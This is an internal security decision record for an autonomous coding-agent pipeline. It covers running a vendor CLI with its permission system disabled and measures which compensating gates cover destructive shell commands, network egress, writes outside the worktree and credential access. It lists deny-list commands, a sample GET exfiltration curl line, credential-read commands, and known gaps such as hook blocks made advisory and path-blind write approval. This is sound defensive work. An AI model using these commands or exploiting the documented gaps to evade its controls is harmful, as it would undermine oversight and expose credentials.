# Agent Vendor Permission Bypass — `--dangerously-skip-permissions`

CUI // SP-CTI

**Task:** exa-bench-04 · **Control:** AC-3 / AC-6 / CM-7 · **ADR:** D394, D395
**Evidence:** `tests/test_skip_permissions_compensating_controls.py`

`tools/agents/adapters/claude_cli.py` invokes Claude Code with
`--dangerously-skip-permissions`. That adapter is `ADAPTER` for the `claude_cli`
executor, it is what the kanban runner dispatches through, and it is first in
the executor chain — so **every autonomous ICDEV build runs with the vendor
permission system disabled.**

Until now that was an incidental flag sitting in a list next to `--max-turns`
and `--output-format json`. This document makes it a stated decision, names what
is given up, names what compensates, and — the part that was missing — reports a
**measured** coverage matrix rather than an assertion that the ICDEV gates
"cover it."

---

## 1. The decision

**Keep the flag.** The adapter's whole purpose is non-interactive dispatch. The
vendor permission system's answer to an unattended prompt is to wait for a human
who is not there; `spawn()` hands the child a temp file on stdin and returns a
`Popen` for the kanban runner's poll/kill loop. A permission prompt in that path
does not make the build safer, it makes it hang until the runner's timeout kills
it — which is a liveness failure that reads as a safety control only until the
first time it fires.

**Consequence accepted:** the vendor prompt is not a control ICDEV has. Nor is
`.claude/settings.json`'s `permissions.deny` list — the permission system is what
evaluates that list, and the flag turns the permission system off. That list
(`rm -rf *`, `git push --force*`, `git reset --hard*`, `DROP TABLE*`, branch and
worktree deletes) is best read as a **precise inventory of what is given up**,
not as a second line of defence.

## 2. What actually observes a tool call — by path

This is the distinction that gets mis-stated most often, including in ICDEV's own
prose, so it is stated first and precisely.

| Execution path | What runs | Controls in the tool-call path |
|---|---|---|
| **In-process agent loop** — Studio `node_type: agent` steps, via `tools/studio/executors/agent_executor.py` | `icdev.tools.llm.agent_loop.run_agent_loop` inside the ICDEV process | `tools/studio/executors/agent_tool_gate.py` (AGENT-WF-001, default-deny, offer time **and** call time) chained to `tools/agent_runtime/approval_gate.py` (ars-appr-01 reversibility) |
| **Spawned vendor CLI** — `claude_cli` adapter, the kanban runner's path | a **separate** `claude` process, `Popen`'d | `.claude/hooks/pre_tool_use.py` only |

`agent_executor.py` is the sole module that calls both `build_gate_hook` and
`build_approval_hook`. `tools/agents/` imports neither — verifiable with
`grep -rn "approval_gate\|agent_tool_gate" tools/agents/`, which returns nothing.
The spawned CLI is a different process that imports no ICDEV module at all.

So: **the two gates usually named as the compensating controls for this flag are
not in this adapter's path.** They are real, they are default-deny, and they are
genuinely stronger than a vendor prompt — for the in-process loop. For the
spawned CLI the only ICDEV code that sees a tool call is the PreToolUse hook, and
`.claude/settings.json` wires that hook as:

```
python $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py || true
```

A PreToolUse hook signals "block" with **exit code 2**. `|| true` makes the shell
return 0 regardless. Every hard block that file advertises is therefore advisory
in an interactive session. (The headless path,
`tools/airgap/hook_compat.py::run_pre_tool_check`, has no such wrapper and does
block — the unattended path is the weaker of the two.) That is filed as
`exa-bench-05` and is **not** fixed here: deleting `|| true` converts nine
never-load-tested checks into hard blocks for every concurrent session on the
host at once, so per-check false-positive rates have to be surveyed first.

## 3. Compensating controls, and why they are defensible where they apply

For the in-process loop the ICDEV stack is arguably stronger than the prompt it
replaces, for three reasons that a per-call yes/no prompt does not give you:

1. **Default-deny by name, twice.** `agent_workflow_tools` in
   `args/security_gates.yaml` has `default: deny`. `authorize_toolset` filters at
   offer time so an unauthorized tool is never described to the model, and
   `build_gate_hook` re-checks at call time because "not offered" is a weaker
   claim than "not authorized."
2. **Default-deny by tier.** `args/agent_approval_policy.yaml` sets
   `default_tier: unknown` with `unknown` in `require_approval_tiers`. A tool has
   to be *named* to be automatic. Content patterns may always **escalate** and may
   only **downgrade** for a declared generic executor.
3. **Append-only evidence.** Every decision, allowed and refused, lands in
   `agent_approval_log` / `studio_mcp_dispatch_audit` with actor and reason.
   Argument values are never stored — key names and a SHA-256 only.

A vendor prompt has none of the three: it is per-call, it is not recorded, and it
fails open the moment a human clicks through.

## 4. Measured coverage of the four categories

### What "covered" has to mean

A vendor prompt interposes a human decision **on every call, with the arguments
in front of the approver**. So the bar is *per-call* mediation — and the two
ICDEV layers do not both clear it:

- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**, and — since
  `exa-bench-09` — by **path** for an argument naming credential material. A
  refusal is per call: the tool is never callable. But `requires_approval` parks
  **one gate per `(run, tool)`** — `approval_step_id("write_file")` is
  `approval:agent:write_file` whatever the path, and `await_approval`'s own
  docstring says "an agent that writes ten files asks once."
- **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
  every call. This is the layer that can tell `rm -rf /` from `ls`. For a path it
  told nothing apart at all until `exa-bench-09` added a **confidentiality**
  dimension, consulted independently of the reversibility tier.

Four mediation strengths result, and only the first two clear the bar:

| Strength | Meaning |
|---|---|
| `refused` | not allowlisted — never offered, never callable |
| `per_call_approval` | content-aware halt on **every** call |
| `per_run_approval_only` | one path-blind human gate for the whole run |
| `unmediated` | no decision at any layer |

### The matrix

Every verdict below is measured, not asserted, and is pinned probe-by-probe in
`tests/test_skip_permissions_compensating_controls.py`.

| Category | Verdict | Strength | What decides it |
|---|---|---|---|
| **Destructive shell** | **COVERED** | `per_call_approval` | Explicit `irreversible` patterns (`rm -rf`, `git reset --hard`, `git clean -dfx`, `DROP TABLE`, `mkfs`, `dd if=`) halt every call; anything else on `run_command` falls to `default_tier: unknown` and halts anyway. |
| **Network egress** | **COVERED — by the default, not by an egress rule** | `per_call_approval` / `refused` | The `curl`/`wget` pattern only matches `-X POST\|PUT\|DELETE\|PATCH`, `--data`, `-d `. A GET exfil (`curl https://x/?d=secret`) matches **no** pattern — it halts because it lands in `unknown`. `http_post` and `upload_file` are not allowlisted at all, so they are refused outright. |
| **Writes outside the worktree** | **NOT COVERED** | `per_run_approval_only` | `write_file` / `patch_file` are gated by **name**, once per run. Then `approval_gate` auto-allows them — tier `recoverable`, path never examined. So the human who approved `write_file tools/foo.py` also approved `write_file ~/.ssh/authorized_keys`; they were never shown a path. `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern and is auto-allowed for any path on the same one-gate-per-run basis. |
| **Credential access** | **COVERED** (closed by `exa-bench-09`) | `refused` | A call whose path argument names credential material is refused at AGENT-WF-001 by `check_path_allowed()`, and halted one layer down by `approval_gate`'s **confidentiality** dimension. Both read the same inventory, `args/sensitive_paths.yaml`, which also backs the `zero_access` file tier. `refused` rather than `per_call_approval` deliberately: a credential read is not a question to put to a tired operator at 3am. |

Two things this matrix says that the shorter version got wrong, and which are
worth stating because they are the difference between a real finding and a
scary-sounding one:

- Writes are **not** ungated — they are gated *by name, once per run*. That is a
  meaningfully weaker guarantee than a vendor prompt, not the absence of one.
  `edit_file` and `apply_patch` are in fact refused outright, but only because
  nobody allowlisted those spellings — an accident of naming, not a path policy,
  and it would evaporate the moment someone adds them.
- Egress is covered by the **fail-closed default**, not by an egress rule. The
  protection is real and it is also incidental.

### Why the two gaps were structural, not oversights

Both fell out of a rationale that is correct in its own frame and silently loses
its premise at the worktree boundary:

- `write_file` is `recoverable` **because git restores it**. Git only restores
  paths *inside the repo*. The tier is right for `tools/foo.py` and wrong for
  `~/.ssh/authorized_keys`, and nothing in the classifier can tell them apart
  because it never looks at the path. The AGENT-WF-001 gate above it is
  name-scoped for the same reason it can be one-gate-per-run at all: a tool
  name is a constant, a path is an argument. **Still open — `exa-bench-07`.**
- `read_file` is exempt from escalation **because its arguments are data, not
  commands** — a fix for a real defect, where `read_file("how do I git push")`
  used to halt for approval and taught operators to approve reflexively. The
  exemption is sound against *escalation by incidental text*. It was also
  total, so it removed the only mechanism by which a credential path could ever
  raise a read's tier. **Closed by `exa-bench-09` — see below.**

### How the credential gap was closed (`exa-bench-09`)

The diagnosis above was the right measurement and the wrong conclusion. Rule 0
was never the defect: **reversibility is the wrong axis for a read.** A read of
`~/.netrc` is *perfectly reversible* — nothing changed — and *completely
unrecoverable* — the credential is disclosed and cannot be un-disclosed. Those
are two questions, and the four tiers only have a word for the first.

So rule 0 stays exactly as it is, and a second axis was added:

| Layer | Change |
|---|---|
| `args/sensitive_paths.yaml` | The inventory, defined **once**. `~/.aws/credentials` (no extension, so `**/credentials.json` never matched it), `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.docker/config.json`, `~/.netrc`, plus the SSH/GPG/tfstate material the tier list already had. |
| `args/file_access_tiers.yaml` | `zero_access` now carries `inherits: sensitive_paths` and **no pattern list of its own**. Its hand-maintained copy is precisely how it came to cover `**/credentials.json` and not `~/.aws/credentials`. |
| `tools/hooks/shared_checks.py` | The `Bash` branch gained a **read-command** inspection. It previously matched `rm` targets and `>` redirects — both *write* shapes — so `cat ~/.aws/credentials` was never examined at all, and neither was `env \| grep -i key`, which discloses a credential with no path for a path list to match. |
| `tools/agent_runtime/approval_gate.py` | A `confidentiality` dimension on `Classification`, consulted **independently of the tier** by `_apply_confidentiality()`. A credential read halts; `read_file("how do I git push safely")` still does not; `read_file`'s tier is still reported as `reversible`, because it is. |
| `tools/studio/executors/agent_tool_gate.py` | `check_path_allowed()`, called from `authorize()` at **call** time (at offer time there is no path to constrain). New block condition `agent_tool_sensitive_path` — its own reason, because the tool *is* allowlisted; what was refused is its reach. |

Two scoping decisions worth stating, because both are load-bearing:

- **Read verbs only.** `touch ~/.ssh/authorized_keys` and `mkdir /etc/cron.d`
  are writes and are deliberately *not* matched. Absorbing them would report
  `exa-bench-07` as closed while nothing about it changed —
  `test_a_shell_read_of_a_credential_is_escalated_but_a_write_is_not` pins that.
- **Path-like arguments only**, never the flattened input. A `content` that
  mentions `~/.netrc` is a document about a credential, not a read of one, and a
  gate that halts on documents is the same reflexive-approval failure rule 0
  exists to prevent, one axis further along.

**Not built on `policy_engine.py`, and why.** This write-up originally proposed
that `tools/agent_runtime/policy_engine.py` (exa-policy-01) — an ALLOW/DENY/ASK
layer whose vocabulary does include an outright DENY — was the right home. It
was not taken: as of `exa-bench-09` that module still has **no consumer** in
either the agent-loop or the Studio executor path (its only importer is
`policy_composition.py`, another unconsumed layer), so building on it would have
meant wiring the whole policy hook into `agent_executor.py` first. That is a
larger change than this gap, it belongs to the exa-policy sequence, and the
result would have been a credential gap left open for the duration. The
confidentiality dimension is additive and does not stand in the way: when the
policy hook is wired, a DENY on a sensitive path is the natural upgrade from the
`refused` verdict AGENT-WF-001 gives today.

## 5. Follow-up tasks — filed, not quietly accepted

All five were already on the board when this write-up landed — they cite "ADR
D394" because they were filed expecting the decision to be written up, which is
what exa-bench-04 does. Nothing here is newly discovered *and* unfiled; the
contribution is the decision, the measurement, and the regression harness.

| Task | Gap | Category |
|---|---|---|
| `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. | (the hook itself) |
| `exa-bench-06` | The Claude Code hook runs 9 of the 10 shared checks — `check_git_danger` is never called from `main()` — and `_REDIRECT_TARGET_RE` mis-captures `>>`, so an append redirect defeats the file tiers. | destructive shell / writes |
| `exa-bench-07` | No worktree containment on any surface. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. | **writes outside the worktree** |
| `exa-bench-08` | No egress concept in the hook at all, and in-process coverage rests on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removes it silently. | **network egress** |
| ~~`exa-bench-09`~~ **CLOSED** | Credential-path reads were unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list missed `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. Closed by one shared inventory (`args/sensitive_paths.yaml`) consumed by all three surfaces, plus a confidentiality axis on `classify()` that leaves rule 0 intact. | **credential access** |

## 6. How this stays true

`tests/test_skip_permissions_compensating_controls.py` fails on **both**
directions of drift:

- a **regression** — a covered category stops halting;
- an **unrecorded fix** — an uncovered category starts halting while this
  document still lists it as a gap.

The second is the unusual one and it is deliberate. A gap that gets closed
without the write-up being updated leaves the next reader with a document that
overstates the risk, which is the same failure mode as one that understates it.
Run the test when touching `tools/agents/adapters/claude_cli.py`,
`.claude/hooks/pre_tool_use.py`, `tools/hooks/shared_checks.py`,
`args/agent_approval_policy.yaml`, `args/sensitive_paths.yaml`,
`args/file_access_tiers.yaml`, or `agent_workflow_tools` in
`args/security_gates.yaml`.

```bash
pytest tests/test_skip_permissions_compensating_controls.py -v
```
